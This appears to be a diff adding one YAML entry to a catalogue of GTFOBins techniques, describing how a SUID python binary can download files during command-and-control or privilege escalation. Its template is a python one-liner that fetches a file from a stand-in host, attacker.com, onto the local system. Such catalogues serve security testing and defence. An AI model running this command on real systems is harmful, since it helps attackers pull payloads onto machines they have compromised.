@@ -1,0 +1,30 @@
+id: gtfobins/python/download/suid
+type: binary
+platform: linux
+name: python
+phases:
+- command-and-control
+- privilege-escalation
+capabilities:
+- file-download
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'python -c ''import sys; from os import environ as e
+
+    if sys.version_info.major == 3: import urllib.request as r
+
+    else: import urllib as r
+
+    r.urlretrieve("http://attacker.com/path/to/input-file", "/path/to/output-file")'''
+references:
+- https://gtfobins.github.io/gtfobins/python/
+tags:
+- linux
+- unix
+- gtfobins
